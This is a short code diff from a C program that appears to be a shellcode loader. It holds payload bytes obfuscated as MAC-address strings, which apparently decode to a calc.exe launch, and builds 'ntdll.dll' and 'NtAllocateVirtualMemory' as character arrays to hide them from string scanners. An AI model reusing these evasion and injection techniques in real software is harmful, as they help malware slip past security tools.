@@ -277,6 +277,7 @@ int main() {
         "63-2E-65-78-65-00",
     };
 
+
     const char ntdll[] = { 'n','t','d','l','l','.','d','l','l', 0 };
     const char NtAlloc[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
 
